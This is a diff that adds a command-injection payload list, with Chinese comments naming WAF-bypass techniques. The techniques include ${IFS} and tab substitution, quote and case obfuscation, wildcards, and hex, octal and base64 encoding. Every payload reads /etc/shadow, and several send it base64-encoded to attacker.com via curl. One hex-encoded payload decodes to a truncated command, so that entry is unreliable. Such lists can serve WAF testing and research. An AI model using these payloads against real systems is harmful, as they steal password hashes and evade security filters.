@@ -1,0 +1,36 @@
+# CMD WAF 绕过 - ${IFS} 替代空格执行命令
+;cat${IFS}/etc/shadow
+# CMD WAF 绕过 - {} 大括号展开替代空格
+;{cat,/etc/shadow}
+# CMD WAF 绕过 - TAB 编码 %09 替代空格
+;cat%09/etc/shadow
+# CMD WAF 绕过 - $() 命令替换执行
+;$(cat /etc/shadow|base64|curl attacker.com -d @-)
+# CMD WAF 绕过 - 反引号命令替换执行
+;`cat /etc/shadow|base64|curl attacker.com -d @-`
+# CMD WAF 绕过 - 十六进制编码绕过关键词过滤
+;echo -e '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77'|bash
+# CMD WAF 绕过 - 八进制编码绕过关键词过滤
+;eval $'\143\141\164\040\057\145\164\143\057\163\150\141\144\157\167'
+# CMD WAF 绕过 - xxd 十六进制还原执行
+;xxd -r -p<<<636174202f6574632f736861646f777c62617365|bash
+# CMD WAF 绕过 - 通配符绕过命令名关键字
+;/??n?/?at /???/????d?w
+# CMD WAF 绕过 - printf 十六进制还原执行
+;$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77')|bash
+# CMD WAF 绕过 - 大小写混合绕过命令名检测
+;CaT /eTc/ShAdOw|base64|curl attacker.com -d @-
+# CMD WAF 绕过 - 引号包裹绕过命令名检测
+;c'a't /e't'c/s'h'adow|base64|curl attacker.com -d @-
+# CMD WAF 绕过 - 双引号包裹绕过命令名检测
+;c"a"t /e"t"c/s"h"adow|base64|curl attacker.com -d @-
+# CMD WAF 绕过 - $@ 空变量绕过命令名检测
+;c$@at /etc/shadow
+# CMD WAF 绕过 - 输入重定向替代空格
+;cat</etc/shadow
+# CMD WAF 绕过 - 变量截取构造 / 符号 (${HOME:0:1})
+;cat ${HOME:0:1}etc${HOME:0:1}shadow
+# CMD WAF 绕过 - tr 字符替换构造 /
+;cat $(echo .|tr '!-0' '"-1')etc$(echo .|tr '!-0' '"-1')shadow
+# CMD WAF 绕过 - base64 全编码绕过
+;echo Y3VybCBhdHRhY2tlci5jb20vJChjYXQgL2V0Yy9zaGFkb3d8YmFzZTY0KQ== |base64 -d|bash
